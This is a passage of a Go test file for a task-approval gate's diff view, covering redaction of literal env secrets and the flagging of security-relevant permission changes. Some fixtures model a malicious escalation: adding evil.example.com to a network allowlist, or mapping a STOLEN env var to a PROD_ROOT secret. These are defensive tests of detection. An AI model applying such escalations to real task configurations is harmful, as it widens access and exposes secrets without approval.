package approval

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/dicode/dicode/pkg/task"
)

// TestDiffFlagsChangedFileEvenWhenBothSidesAreCapped is the regression for a
// review finding on #604's diff surface: two different versions of a file
// that both hit a snapshot cap (oversized, or binary) must not both collapse
// to the same bare snapshotPlaceholder string and compare as "unchanged" —
// the underlying content hash gated approval specifically because this file
// changed, so Diff must surface that as "modified" (with a too-large/binary
// note, since the content itself was never captured), not silently drop it
// from Files. Exercises the binary path (sha256 content fingerprint, exact
// and deterministic — the size+mtime path for oversized text files depends
// on filesystem mtime granularity and is covered structurally, not by exact
// value, since a flaky mtime collision would be a false test failure rather
// than a real one).
func TestDiffFlagsChangedFileEvenWhenBothSidesAreCapped(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())
	spec := writeTaskDir(t, t.TempDir(), "repo/binfile", "unused\n")
	binPath := filepath.Join(spec.TaskDir, "task.bin")

	binaryA := append([]byte{0xff, 0xfe, 0x00, 0x01}, []byte(strings.Repeat("A", 64))...)
	if err := os.WriteFile(binPath, binaryA, 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := g.Admit(spec); err != nil {
		t.Fatalf("Admit: %v", err)
	}
	if err := g.Approve("repo/binfile"); err != nil {
		t.Fatalf("Approve: %v", err)
	}

	// Different binary content, same invalid-UTF-8 shape — both versions hit
	// the "binary" placeholder path and, before this fix, would have stored
	// the identical bare snapshotPlaceholder string for both.
	binaryB := append([]byte{0xff, 0xfe, 0x00, 0x01}, []byte(strings.Repeat("B", 64))...)
	if err := os.WriteFile(binPath, binaryB, 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := g.Admit(spec); err != nil {
		t.Fatalf("Admit changed: %v", err)
	}

	d, err := g.Diff("repo/binfile")
	if err != nil {
		t.Fatalf("Diff: %v", err)
	}
	var bin *FileDiff
	for i := range d.Files {
		if d.Files[i].Path == "task.bin" {
			bin = &d.Files[i]
		}
	}
	if bin == nil {
		t.Fatalf("task.bin missing from Diff().Files entirely — the changed binary file vanished instead of surfacing as modified: %+v", d.Files)
	}
	if bin.Status != "modified" {
		t.Errorf("Status = %q, want %q", bin.Status, "modified")
	}
	if bin.UnifiedDiff != snapshotPlaceholder {
		t.Errorf("UnifiedDiff = %q, want the placeholder note (content was never captured)", bin.UnifiedDiff)
	}
}

// TestDiffTreatsIdenticalCappedFilesAsUnchanged is the flip side of
// TestDiffFlagsChangedFileEvenWhenBothSidesAreCapped: a file that hits a
// snapshot cap but is genuinely byte-identical between the approved and
// pending snapshots must still be reported unchanged (omitted from Files),
// not spuriously flagged as modified just because it was capped.
func TestDiffTreatsIdenticalCappedFilesAsUnchanged(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())
	spec := writeTaskDir(t, t.TempDir(), "repo/binfile2", "unused\n")
	binPath := filepath.Join(spec.TaskDir, "task.bin")

	binary := append([]byte{0xff, 0xfe, 0x00, 0x01}, []byte(strings.Repeat("Z", 64))...)
	if err := os.WriteFile(binPath, binary, 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := g.Admit(spec); err != nil {
		t.Fatalf("Admit: %v", err)
	}
	if err := g.Approve("repo/binfile2"); err != nil {
		t.Fatalf("Approve: %v", err)
	}

	// A second, unrelated file changes so the task re-pends; task.bin itself
	// is untouched.
	if err := os.WriteFile(filepath.Join(spec.TaskDir, "task.js"), []byte("unused v2\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := g.Admit(spec); err != nil {
		t.Fatalf("Admit changed: %v", err)
	}

	d, err := g.Diff("repo/binfile2")
	if err != nil {
		t.Fatalf("Diff: %v", err)
	}
	for _, f := range d.Files {
		if f.Path == "task.bin" {
			t.Fatalf("task.bin reported as %q but its content did not change — spurious diff entry: %+v", f.Status, f)
		}
	}
}

// TestDiffShowsModifiedFileAfterApproval is the core regression for #604: once
// a task has been approved and its content later changes, Diff must report
// the changed file with the correct added/removed lines against the cached
// approved baseline, and HasBaseline must be true since a baseline snapshot
// was captured at approval time.
func TestDiffShowsModifiedFileAfterApproval(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())
	spec := writeTaskDir(t, t.TempDir(), "repo/deploy", "line one\nline two\n")

	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("Admit = (%v, %v), want (false, nil) pending", armed, err)
	}
	if err := g.Approve("repo/deploy"); err != nil {
		t.Fatalf("Approve: %v", err)
	}

	// Content changes on disk; re-admit re-pends at the new hash.
	if err := os.WriteFile(filepath.Join(spec.TaskDir, "task.js"), []byte("line one\nline TWO CHANGED\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("Admit changed = (%v, %v), want (false, nil) pending", armed, err)
	}

	d, err := g.Diff("repo/deploy")
	if err != nil {
		t.Fatalf("Diff: %v", err)
	}
	if !d.HasBaseline {
		t.Fatal("HasBaseline = false, want true (task was previously approved)")
	}
	if d.TaskID != "repo/deploy" {
		t.Fatalf("TaskID = %q", d.TaskID)
	}
	var jsDiff *FileDiff
	for i := range d.Files {
		if d.Files[i].Path == "task.js" {
			jsDiff = &d.Files[i]
		}
	}
	if jsDiff == nil {
		t.Fatalf("no task.js entry in Files: %+v", d.Files)
	}
	if jsDiff.Status != "modified" {
		t.Fatalf("task.js status = %q, want modified", jsDiff.Status)
	}
	if !strings.Contains(jsDiff.UnifiedDiff, "- line two") {
		t.Errorf("unified diff missing removed line: %q", jsDiff.UnifiedDiff)
	}
	if !strings.Contains(jsDiff.UnifiedDiff, "+ line TWO CHANGED") {
		t.Errorf("unified diff missing added line: %q", jsDiff.UnifiedDiff)
	}
	if !strings.Contains(jsDiff.UnifiedDiff, "  line one") {
		t.Errorf("unified diff missing unchanged context line: %q", jsDiff.UnifiedDiff)
	}
}

// TestDiffNoBaselineOnFirstObservation covers a task pending on first-ever
// observation (never approved in this gate's lifetime, e.g. right after
// daemon start with no prior approvedFiles cache): Diff must report
// HasBaseline=false and still surface the pending content as "added" entries
// so the UI has something useful to show.
func TestDiffNoBaselineOnFirstObservation(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())
	spec := writeTaskDir(t, t.TempDir(), "repo/fresh", "export default () => 1\n")

	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("Admit = (%v, %v), want (false, nil) pending", armed, err)
	}

	d, err := g.Diff("repo/fresh")
	if err != nil {
		t.Fatalf("Diff: %v", err)
	}
	if d.HasBaseline {
		t.Fatal("HasBaseline = true, want false (never approved before)")
	}
	if len(d.Files) == 0 {
		t.Fatal("Files empty, want the pending files reported as added")
	}
	for _, fd := range d.Files {
		if fd.Status != "added" {
			t.Errorf("file %q status = %q, want added (no baseline)", fd.Path, fd.Status)
		}
	}
	var sawTaskJS bool
	for _, fd := range d.Files {
		if fd.Path == "task.js" {
			sawTaskJS = true
			if !strings.Contains(fd.UnifiedDiff, "+ export default () => 1") {
				t.Errorf("task.js added-diff missing content: %q", fd.UnifiedDiff)
			}
		}
	}
	if !sawTaskJS {
		t.Fatalf("task.js missing from Files: %+v", d.Files)
	}
}

// TestDiffFlagsPermissionsChangeAsSecurityRelevant covers a task.yaml edit
// that adds a permissions block: the changed file's diff must be flagged
// SecurityRelevant since "permissions:" is one of the fields folded into the
// approval content hash.
func TestDiffFlagsPermissionsChangeAsSecurityRelevant(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())
	spec := writeTaskDir(t, t.TempDir(), "repo/deploy", "x")
	yamlPath := filepath.Join(spec.TaskDir, "task.yaml")

	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("Admit = (%v, %v), want pending", armed, err)
	}
	if err := g.Approve("repo/deploy"); err != nil {
		t.Fatalf("Approve: %v", err)
	}

	updated := "name: repo/deploy\npermissions:\n  net:\n    - api.example.com\n"
	if err := os.WriteFile(yamlPath, []byte(updated), 0o644); err != nil {
		t.Fatal(err)
	}
	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("Admit changed = (%v, %v), want pending", armed, err)
	}

	d, err := g.Diff("repo/deploy")
	if err != nil {
		t.Fatalf("Diff: %v", err)
	}
	var yamlDiff *FileDiff
	for i := range d.Files {
		if d.Files[i].Path == "task.yaml" {
			yamlDiff = &d.Files[i]
		}
	}
	if yamlDiff == nil {
		t.Fatalf("no task.yaml entry in Files: %+v", d.Files)
	}
	if !yamlDiff.SecurityRelevant {
		t.Errorf("task.yaml diff with a permissions block must be SecurityRelevant: %q", yamlDiff.UnifiedDiff)
	}
}

// TestDiffCosmeticChangeNotSecurityRelevant covers the flip side: a
// comment/description-only edit must change content (hash still drifts,
// re-pending the task) but must NOT be flagged SecurityRelevant.
func TestDiffCosmeticChangeNotSecurityRelevant(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())
	spec := writeTaskDir(t, t.TempDir(), "repo/deploy", "x")
	yamlPath := filepath.Join(spec.TaskDir, "task.yaml")

	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("Admit = (%v, %v), want pending", armed, err)
	}
	if err := g.Approve("repo/deploy"); err != nil {
		t.Fatalf("Approve: %v", err)
	}

	updated := "name: repo/deploy\ndescription: a friendlier description of what this task does\n"
	if err := os.WriteFile(yamlPath, []byte(updated), 0o644); err != nil {
		t.Fatal(err)
	}
	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("Admit changed = (%v, %v), want pending", armed, err)
	}

	d, err := g.Diff("repo/deploy")
	if err != nil {
		t.Fatalf("Diff: %v", err)
	}
	var yamlDiff *FileDiff
	for i := range d.Files {
		if d.Files[i].Path == "task.yaml" {
			yamlDiff = &d.Files[i]
		}
	}
	if yamlDiff == nil {
		t.Fatalf("no task.yaml entry in Files: %+v", d.Files)
	}
	if yamlDiff.SecurityRelevant {
		t.Errorf("cosmetic description-only diff must not be SecurityRelevant: %q", yamlDiff.UnifiedDiff)
	}
}

// TestDiffRedactsLiteralEnvSecretValue is the regression for the security
// finding on #636: task.EnvEntry.Value (pkg/task/spec.go) lets a task's
// permissions.env block carry a literal secret inline in task.yaml. Before
// snapshotDir redacted YAML "value:" lines, that literal flowed unmodified
// into Gate.approvedFiles/pendingEntry.files and out through Gate.Diff's
// UnifiedDiff — rendered in full on the unauthenticated /approve/{token}
// confirm page and the pending-diff REST endpoint. This asserts the literal
// never appears in the diff, that <redacted> appears in its place so the
// diff still shows the field changed, and that SecurityRelevant is still set
// (securityFieldPattern matches on the surrounding "permissions"/"env" keys,
// which remain visible — only the scalar after "value:" is blanked).
func TestDiffRedactsLiteralEnvSecretValue(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())
	spec := writeTaskDir(t, t.TempDir(), "repo/deploy", "x")
	yamlPath := filepath.Join(spec.TaskDir, "task.yaml")

	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("Admit = (%v, %v), want pending", armed, err)
	}
	if err := g.Approve("repo/deploy"); err != nil {
		t.Fatalf("Approve: %v", err)
	}

	const secret = "some-secret-literal-xyz"
	updated := "name: repo/deploy\n" +
		"permissions:\n" +
		"  env:\n" +
		"    - name: API_KEY\n" +
		"      value: \"" + secret + "\"\n"
	if err := os.WriteFile(yamlPath, []byte(updated), 0o644); err != nil {
		t.Fatal(err)
	}
	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("Admit changed = (%v, %v), want pending", armed, err)
	}

	d, err := g.Diff("repo/deploy")
	if err != nil {
		t.Fatalf("Diff: %v", err)
	}
	var yamlDiff *FileDiff
	for i := range d.Files {
		if d.Files[i].Path == "task.yaml" {
			yamlDiff = &d.Files[i]
		}
	}
	if yamlDiff == nil {
		t.Fatalf("no task.yaml entry in Files: %+v", d.Files)
	}
	if strings.Contains(yamlDiff.UnifiedDiff, secret) {
		t.Errorf("unified diff must not contain the literal secret value: %q", yamlDiff.UnifiedDiff)
	}
	if !strings.Contains(yamlDiff.UnifiedDiff, redactedEnvValue) {
		t.Errorf("unified diff must show %q in place of the secret: %q", redactedEnvValue, yamlDiff.UnifiedDiff)
	}
	if !yamlDiff.SecurityRelevant {
		t.Errorf("task.yaml diff with a permissions.env change must still be SecurityRelevant: %q", yamlDiff.UnifiedDiff)
	}
}

// TestDiffRedactsBlockScalarEnvSecretValue is the regression for the
// follow-up CodeRabbit finding on #636: TestDiffRedactsLiteralEnvSecretValue
// above only covers the inline-scalar form (`value: "secret"` on one line).
// A task.yaml author using YAML block-scalar syntax (`value: |`) for a
// permissions.env literal secret has the actual secret content on the
// following, more-indented lines — which redactValueLines's original
// inline-only pattern did not touch at all, leaking it unredacted into the
// diff. This asserts neither block-scalar content line reaches the diff.
func TestDiffRedactsBlockScalarEnvSecretValue(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())
	spec := writeTaskDir(t, t.TempDir(), "repo/deploy", "x")
	yamlPath := filepath.Join(spec.TaskDir, "task.yaml")

	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("Admit = (%v, %v), want pending", armed, err)
	}
	if err := g.Approve("repo/deploy"); err != nil {
		t.Fatalf("Approve: %v", err)
	}

	const secret1 = "super-secret-line-1"
	const secret2 = "super-secret-line-2"
	updated := "name: repo/deploy\n" +
		"permissions:\n" +
		"  env:\n" +
		"    - name: API_KEY\n" +
		"      value: |\n" +
		"        " + secret1 + "\n" +
		"        " + secret2 + "\n"
	if err := os.WriteFile(yamlPath, []byte(updated), 0o644); err != nil {
		t.Fatal(err)
	}
	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("Admit changed = (%v, %v), want pending", armed, err)
	}

	d, err := g.Diff("repo/deploy")
	if err != nil {
		t.Fatalf("Diff: %v", err)
	}
	var yamlDiff *FileDiff
	for i := range d.Files {
		if d.Files[i].Path == "task.yaml" {
			yamlDiff = &d.Files[i]
		}
	}
	if yamlDiff == nil {
		t.Fatalf("no task.yaml entry in Files: %+v", d.Files)
	}
	if strings.Contains(yamlDiff.UnifiedDiff, secret1) {
		t.Errorf("unified diff must not contain the literal block-scalar secret line 1: %q", yamlDiff.UnifiedDiff)
	}
	if strings.Contains(yamlDiff.UnifiedDiff, secret2) {
		t.Errorf("unified diff must not contain the literal block-scalar secret line 2: %q", yamlDiff.UnifiedDiff)
	}
	if !strings.Contains(yamlDiff.UnifiedDiff, redactedEnvValue) {
		t.Errorf("unified diff must show %q in place of the block-scalar secret: %q", redactedEnvValue, yamlDiff.UnifiedDiff)
	}
	if !strings.Contains(yamlDiff.UnifiedDiff, "value: |") {
		t.Errorf("unified diff must still show the block-scalar header line so the field's presence/change is visible: %q", yamlDiff.UnifiedDiff)
	}
	if !yamlDiff.SecurityRelevant {
		t.Errorf("task.yaml diff with a permissions.env change must still be SecurityRelevant: %q", yamlDiff.UnifiedDiff)
	}
}

// TestDiffErrorsOnNonPendingOrUnknownTask covers Diff's error path: an
// approved (non-pending) task and an entirely unknown task ID both fail.
func TestDiffErrorsOnNonPendingOrUnknownTask(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())

	if _, err := g.Diff("repo/never-seen"); err == nil {
		t.Fatal("Diff on unknown task must error")
	}

	spec := writeTaskDir(t, t.TempDir(), "repo/deploy", "x")
	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("Admit = (%v, %v), want pending", armed, err)
	}
	if err := g.Approve("repo/deploy"); err != nil {
		t.Fatalf("Approve: %v", err)
	}
	if _, err := g.Diff("repo/deploy"); err == nil {
		t.Fatal("Diff on an approved (non-pending) task must error")
	}
}

// TestForgetDropsApprovedBaseline is the coverage gap called out on #636:
// Forget must actually drop the cached approved-content snapshot, not just
// the lock record and the pending/admitted entries. Proven behaviorally
// (rather than by reaching into Gate's private fields): after Forget, a
// re-Admit of the same task ID at a brand new hash must produce a Diff with
// HasBaseline=false, exactly as if the gate had never seen this task ID
// before. If Forget left the old approved snapshot behind, Diff would
// wrongly report HasBaseline=true and diff against stale content that no
// longer has anything to do with the (forgotten, then reborn) task.
func TestForgetDropsApprovedBaseline(t *testing.T) {
	g, _, lock := newTestGate(t, enabledPolicy())
	spec := writeTaskDir(t, t.TempDir(), "repo/deploy", "v1")

	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("Admit = (%v, %v), want (false, nil) pending", armed, err)
	}
	if err := g.Approve("repo/deploy"); err != nil {
		t.Fatalf("Approve: %v", err)
	}

	// Sanity check: right after approval + a content change, the cached
	// baseline from the approval is really there.
	if err := os.WriteFile(filepath.Join(spec.TaskDir, "task.js"), []byte("v2"), 0o644); err != nil {
		t.Fatal(err)
	}
	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("Admit changed = (%v, %v), want (false, nil) pending", armed, err)
	}
	if d, err := g.Diff("repo/deploy"); err != nil || !d.HasBaseline {
		t.Fatalf("sanity: Diff = (%+v, %v), want HasBaseline=true right after approval", d, err)
	}

	g.Forget("repo/deploy")
	if _, ok := lock.Get("repo/deploy"); ok {
		t.Fatal("Forget left a lock entry behind")
	}
	if g.IsPending("repo/deploy") {
		t.Fatal("Forget left the task pending")
	}

	// Re-admit the same task ID at yet another new hash, as if it were being
	// adopted fresh. If the old approved snapshot survived Forget, Diff would
	// report a baseline (and diff against v2, which has nothing to do with
	// this "new" observation).
	if err := os.WriteFile(filepath.Join(spec.TaskDir, "task.js"), []byte("v3 — after forget"), 0o644); err != nil {
		t.Fatal(err)
	}
	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("re-admit after Forget = (%v, %v), want (false, nil) pending", armed, err)
	}

	d, err := g.Diff("repo/deploy")
	if err != nil {
		t.Fatalf("Diff: %v", err)
	}
	if d.HasBaseline {
		t.Fatal("HasBaseline = true after Forget + re-Admit at a new hash, want false: " +
			"Forget must drop the old approved snapshot, not just the lock/pending entries")
	}
}

// TestApproveIfHashRejectsStaleTokenAfterRepend is the coverage gap called
// out on #636 for the race approve()'s own doc comment already describes as
// intentionally handled: a concurrent Admit re-pending a task at a newer
// hash while an older-hash approval (e.g. a token minted for the earlier
// version) is in flight. This simulates the race in a single goroutine —
// Admit at H1, Admit again at H2 (as if a concurrent edit landed), then
// ApproveIfHash(H1) — and asserts both that the stale approval is rejected
// and that the H1 snapshot was never wrongly promoted into the approved
// baseline (verified via Diff, since approvedFiles is private).
func TestApproveIfHashRejectsStaleTokenAfterRepend(t *testing.T) {
	g, arm, lock := newTestGate(t, enabledPolicy())
	spec := writeTaskDir(t, t.TempDir(), "repo/deploy", "v1")

	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("Admit = (%v, %v), want (false, nil) pending", armed, err)
	}
	h1, ok := g.PendingHash("repo/deploy")
	if !ok || h1 == "" {
		t.Fatalf("PendingHash after first Admit = (%q, %v)", h1, ok)
	}

	// Simulate a concurrent content change landing before the H1 approval is
	// redeemed: re-Admit re-pends the task at a newer hash H2.
	if err := os.WriteFile(filepath.Join(spec.TaskDir, "task.js"), []byte("v2 — changed"), 0o644); err != nil {
		t.Fatal(err)
	}
	if armed, err := g.Admit(spec); err != nil || armed {
		t.Fatalf("Admit changed = (%v, %v), want (false, nil) pending", armed, err)
	}
	h2, ok := g.PendingHash("repo/deploy")
	if !ok || h2 == "" || h2 == h1 {
		t.Fatalf("PendingHash after re-pend = (%q, %v), want a fresh hash distinct from %q", h2, ok, h1)
	}

	// The stale H1 approval must be rejected: wantHash no longer matches the
	// currently-pending entry's hash.
	if err := g.ApproveIfHash("repo/deploy", h1); err == nil {
		t.Fatal("stale H1 approval must be rejected after a concurrent re-pend at H2")
	}
	if !g.IsPending("repo/deploy") {
		t.Fatal("task must remain pending after a rejected stale approval")
	}
	if got := arm.armedIDs(); len(got) != 0 {
		t.Fatalf("arm called despite the rejected stale approval: %v", got)
	}
	if _, ok := lock.Get("repo/deploy"); ok {
		t.Fatal("rejected stale approval must not write the lock")
	}

	// No approval has ever succeeded for this task, so its H1 (pending, never
	// approved) snapshot must not have been wrongly promoted into the
	// approved baseline. Diff must therefore report no baseline at all.
	d, err := g.Diff("repo/deploy")
	if err != nil {
		t.Fatalf("Diff: %v", err)
	}
	if d.HasBaseline {
		t.Fatal("HasBaseline = true, want false: the stale H1 snapshot must not have been " +
			"promoted into the approved baseline by the rejected approval")
	}

	// The legitimate H2 approval still succeeds.
	if err := g.ApproveIfHash("repo/deploy", h2); err != nil {
		t.Fatalf("ApproveIfHash(H2): %v", err)
	}
	if got := arm.armedIDs(); len(got) != 1 || got[0] != "repo/deploy" {
		t.Fatalf("armed after legitimate H2 approval = %v", got)
	}
}

// TestUnifiedDiffTextOneSidedPlaceholderShowsRealContent is the regression
// for a CodeRabbit finding on #636: unifiedDiffText used to short-circuit to
// the snapshotPlaceholder note whenever EITHER side was a placeholder, which
// hid perfectly available, readable content on the non-placeholder side
// (e.g. the approved baseline was captured as a placeholder because the file
// used to be too large/binary, but the current pending content has since
// shrunk into fully-captured text). Only BOTH sides being placeholders
// should short-circuit; a single placeholder side must be treated as empty
// so the real side still renders as a full add/remove.
func TestUnifiedDiffTextOneSidedPlaceholderShowsRealContent(t *testing.T) {
	const real = "hello\nworld\n"

	if got := unifiedDiffText(snapshotPlaceholder, snapshotPlaceholder); got != snapshotPlaceholder {
		t.Errorf("both sides placeholder: got %q, want the placeholder note verbatim", got)
	}

	// Old (approved) side is a placeholder, new (pending) side has shrunk
	// into real, captured content: the real content must be visible, not
	// hidden behind the placeholder note.
	got := unifiedDiffText(snapshotPlaceholder, real)
	if strings.Contains(got, snapshotPlaceholder) {
		t.Errorf("old-side-only placeholder must not short-circuit to the placeholder note: %q", got)
	}
	if !strings.Contains(got, "hello") || !strings.Contains(got, "world") {
		t.Errorf("old-side-only placeholder must still render the new side's real content: %q", got)
	}

	// Symmetric case: new side is the placeholder, old side has real
	// content that must still show as a removal.
	got = unifiedDiffText(real, snapshotPlaceholder)
	if strings.Contains(got, snapshotPlaceholder) {
		t.Errorf("new-side-only placeholder must not short-circuit to the placeholder note: %q", got)
	}
	if !strings.Contains(got, "hello") || !strings.Contains(got, "world") {
		t.Errorf("new-side-only placeholder must still render the old side's real content: %q", got)
	}
}

// TestDiffHunksLongContext is the regression for the payload/scroll blowup: a
// one-line edit to a large file must not ship the whole file as context.
func TestDiffHunksLongContext(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())

	var b strings.Builder
	for i := 0; i < 500; i++ {
		fmt.Fprintf(&b, "const filler_%d = 'padding';\n", i)
	}
	original := b.String()
	spec := writeTaskDir(t, t.TempDir(), "repo/big", original)

	if _, err := g.Admit(spec); err != nil {
		t.Fatalf("Admit: %v", err)
	}
	if err := g.Approve("repo/big"); err != nil {
		t.Fatalf("Approve: %v", err)
	}

	changed := strings.Replace(original, "const filler_250 = 'padding';", "const filler_250 = 'CHANGED';", 1)
	if err := os.WriteFile(filepath.Join(spec.TaskDir, "task.js"), []byte(changed), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := g.Admit(spec); err != nil {
		t.Fatalf("Admit changed: %v", err)
	}

	d, err := g.Diff("repo/big")
	if err != nil {
		t.Fatalf("Diff: %v", err)
	}
	var js *FileDiff
	for i := range d.Files {
		if d.Files[i].Path == "task.js" {
			js = &d.Files[i]
		}
	}
	if js == nil {
		t.Fatalf("no task.js entry: %+v", d.Files)
	}

	lines := strings.Split(strings.TrimSuffix(js.UnifiedDiff, "\n"), "\n")
	if len(lines) > 4*diffContextLines+4 {
		t.Errorf("context not elided: %d lines rendered for a 1-line change:\n%s", len(lines), js.UnifiedDiff)
	}
	if !strings.Contains(js.UnifiedDiff, "CHANGED") {
		t.Errorf("hunking dropped the change itself:\n%s", js.UnifiedDiff)
	}
	if !strings.Contains(js.UnifiedDiff, "unchanged lines") {
		t.Errorf("want an elision marker for dropped context:\n%s", js.UnifiedDiff)
	}
	// Both sides ship as reconstructed hunks for a client-side viewer, and
	// must stay small — shipping whole files here costs more than the
	// unhunked diff this replaced.
	if js.OldContent == "" || js.NewContent == "" {
		t.Fatalf("want both sides reconstructed, got old=%d new=%d bytes", len(js.OldContent), len(js.NewContent))
	}
	if !strings.Contains(js.NewContent, "CHANGED") || strings.Contains(js.OldContent, "CHANGED") {
		t.Error("reconstructed sides are stale or the wrong way round")
	}
	if n := strings.Count(js.NewContent, "\n"); n > 4*diffContextLines+4 {
		t.Errorf("new side carries the whole file (%d lines), not just its hunks", n)
	}
}

// TestDiffSecurityFlagSurvivesHunking guards the ordering inside Diff:
// flagging runs against the full diff, so a security-relevant line must still
// be flagged when it sits far enough into a large file that hunking elides
// everything around it.
func TestDiffSecurityFlagSurvivesHunking(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())

	var b strings.Builder
	for i := 0; i < 300; i++ {
		fmt.Fprintf(&b, "# filler %d\n", i)
	}
	original := b.String()
	spec := writeTaskDir(t, t.TempDir(), "repo/perm", "unused\n")
	yamlPath := filepath.Join(spec.TaskDir, "task.yaml")
	if err := os.WriteFile(yamlPath, []byte(original), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := g.Admit(spec); err != nil {
		t.Fatalf("Admit: %v", err)
	}
	if err := g.Approve("repo/perm"); err != nil {
		t.Fatalf("Approve: %v", err)
	}

	if err := os.WriteFile(yamlPath, []byte(original+"permissions:\n  net:\n    - evil.example.com\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := g.Admit(spec); err != nil {
		t.Fatalf("Admit changed: %v", err)
	}

	d, err := g.Diff("repo/perm")
	if err != nil {
		t.Fatalf("Diff: %v", err)
	}
	for _, f := range d.Files {
		if f.Path == "task.yaml" {
			if !f.SecurityRelevant {
				t.Errorf("permissions change not flagged after hunking:\n%s", f.UnifiedDiff)
			}
			return
		}
	}
	t.Fatal("no task.yaml entry in diff")
}

// TestDiffRedactsLiteralEnvSecrets covers both literal-secret carriers in
// permissions.env: Value and Default. Default is injected as the env var's
// value when the named secret is missing (pkg/runtime/envresolve), so it
// holds the same class of material and must not reach the diff surfaces —
// which include the unauthenticated /approve/{token} page.
func TestDiffRedactsLiteralEnvSecrets(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())
	spec := writeTaskDir(t, t.TempDir(), "repo/creds", "unused\n")
	yamlPath := filepath.Join(spec.TaskDir, "task.yaml")

	base := "name: creds\npermissions:\n  env:\n    - name: A\n      value: keep-me-secret\n"
	if err := os.WriteFile(yamlPath, []byte(base), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := g.Admit(spec); err != nil {
		t.Fatalf("Admit: %v", err)
	}
	if err := g.Approve("repo/creds"); err != nil {
		t.Fatalf("Approve: %v", err)
	}

	changed := base + "    - name: B\n      secret: B\n      default: pr0d-fallback-Passw0rd\n"
	if err := os.WriteFile(yamlPath, []byte(changed), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := g.Admit(spec); err != nil {
		t.Fatalf("Admit changed: %v", err)
	}

	d, err := g.Diff("repo/creds")
	if err != nil {
		t.Fatalf("Diff: %v", err)
	}
	for _, f := range d.Files {
		for _, leak := range []string{"pr0d-fallback-Passw0rd", "keep-me-secret"} {
			if strings.Contains(f.UnifiedDiff, leak) {
				t.Errorf("%s: literal secret %q leaked into UnifiedDiff:\n%s", f.Path, leak, f.UnifiedDiff)
			}
			if strings.Contains(f.OldContent, leak) || strings.Contains(f.NewContent, leak) {
				t.Errorf("%s: literal secret %q leaked into inlined content sides", f.Path, leak)
			}
		}
	}
}

// TestDiffFlagsPermissionWidening covers the escalation securityFieldPattern
// alone misses: appending to an already-approved permissions block changes
// only a list item, naming no security key on the changed line itself.
func TestDiffFlagsPermissionWidening(t *testing.T) {
	base := "name: t\nruntime: js\npermissions:\n  net:\n    - api.github.com\n  env:\n    - name: A\n      secret: A\n"

	cases := []struct {
		name    string
		changed string
		want    bool
	}{
		{"add host to existing net allowlist",
			"name: t\nruntime: js\npermissions:\n  net:\n    - api.github.com\n    - evil.example.com\n  env:\n    - name: A\n      secret: A\n", true},
		{"add var to existing env block",
			base + "    - name: STOLEN\n      secret: PROD_ROOT\n", true},
		{"repoint an env var at another secret",
			"name: t\nruntime: js\npermissions:\n  net:\n    - api.github.com\n  env:\n    - name: A\n      secret: PROD_ROOT\n", true},
		{"add a trigger sub-key",
			base + "trigger:\n  cron: \"* * * * *\"\n", true},
		{"cosmetic change outside any security block",
			"name: t RENAMED\nruntime: js\npermissions:\n  net:\n    - api.github.com\n  env:\n    - name: A\n      secret: A\n", false},
		{"add an unrelated top-level key",
			base + "description: now documented\n", false},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			g, _, _ := newTestGate(t, enabledPolicy())
			spec := writeTaskDir(t, t.TempDir(), "repo/perm", "unused\n")
			yamlPath := filepath.Join(spec.TaskDir, "task.yaml")
			if err := os.WriteFile(yamlPath, []byte(base), 0o644); err != nil {
				t.Fatal(err)
			}
			if _, err := g.Admit(spec); err != nil {
				t.Fatalf("Admit: %v", err)
			}
			if err := g.Approve("repo/perm"); err != nil {
				t.Fatalf("Approve: %v", err)
			}
			if err := os.WriteFile(yamlPath, []byte(tc.changed), 0o644); err != nil {
				t.Fatal(err)
			}
			if _, err := g.Admit(spec); err != nil {
				t.Fatalf("Admit changed: %v", err)
			}
			d, err := g.Diff("repo/perm")
			if err != nil {
				t.Fatalf("Diff: %v", err)
			}
			for _, f := range d.Files {
				if f.Path != "task.yaml" {
					continue
				}
				if f.SecurityRelevant != tc.want {
					t.Errorf("SecurityRelevant = %v, want %v for %q:\n%s",
						f.SecurityRelevant, tc.want, tc.name, f.UnifiedDiff)
				}
				return
			}
			t.Fatal("no task.yaml entry in diff")
		})
	}
}

// TestRedactSecretsCoversNonLineFormats covers literal env secrets written in
// YAML forms the line scrub cannot see. Both surfaces this feeds — the REST
